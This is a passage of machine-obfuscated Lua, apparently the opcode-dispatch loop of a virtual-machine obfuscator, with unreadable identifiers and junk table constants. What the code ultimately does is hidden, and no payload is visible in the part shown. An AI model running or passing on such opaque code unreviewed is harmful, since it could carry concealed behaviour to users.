fa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wm")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("FdG")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("0X")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("pM8")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Rp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bFJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("btf2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wy")]]==ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("msZs")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("JCF")];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("d3j0NvTdfYH5kd8RKEg9nNdp2TS6SBQt")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("L16oh7VPGyORhMq5j5c2lcA038")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("NWuPhnBJmcDCHvtRpzJUgCa")then if ajefa_IIIlIllIllllIIllIlllIIll>#("GOBrJCgujch2kTHEQde2RE")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FL")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{777;759;285;149};"1 + 1 = 111";"1 + 1 = 111";}]]+ajefa_lllIIlIllIlIllllIIlIIlll[#("ZB3M")];else local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("pN")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]()end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("H1ukBuoXlVWjDWjaV6hrEnCG")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{32;526;429;538};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ka2")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DU")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("pJr")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ob")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rgC")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ch08")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("q4")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("7m9")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fy")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("hI3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lQ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eWJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("lQCx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rS")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fi2")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("9CNi")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Iq")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VJS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("vhNv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MQ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UPp")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("yK8D")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("krK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("vfz0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("05")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("tGp")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pi")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("c3J")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("D97")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{768;979;693;315};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{260;631;950;132};"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oIT")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uF")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("BSi")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fz")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("RyR")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ke")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("zv4")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5k")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("6Fu")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("p8lD")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Zg")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("8nx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("y0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("GOi")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("u2SO")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{333;110;840;809};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("KGB")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("XA")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lr2")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("G0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5Bd")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("VQQe")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Nd")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jD9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("SXHs")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dF")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YIG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Diyr")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7m")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9qA")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("grLq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ph")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PhC")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("FMj3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("9J")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("04")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("J6I")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5A")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("76g")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("y5kj")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{569;346;503;956};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("DTv")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8i")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("B1Q")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("XI")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oBU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{521;334;920;568};}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("iBm")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("87")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("fDg")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("G1uL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{285;588;809;569};}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("009")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("c2")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jr3")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("QAut")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hS")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5X8")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("WO")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("BAn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("67")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("44I")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("G6GP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nL")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("C6X")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gL4I")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mD")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BtO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{39;321;509;706};"1 + 1 = 111";"1 + 1 = 111";{479;556;667;876};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ve")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Uof")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("iGWe")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("0k")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("ZNq")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qk")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("TMv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8EK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("WNxu")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ek")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("C2I")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{145;812;957;991};{879;533;736;197};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("m6z")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ic")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("4sb")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{623;2;354;32};"1 + 1 = 111";}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("dnt")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("30")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("NVC")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LYWx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kq")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("SDc")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("iV")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jLG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("R6r3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("R4")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("IyZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=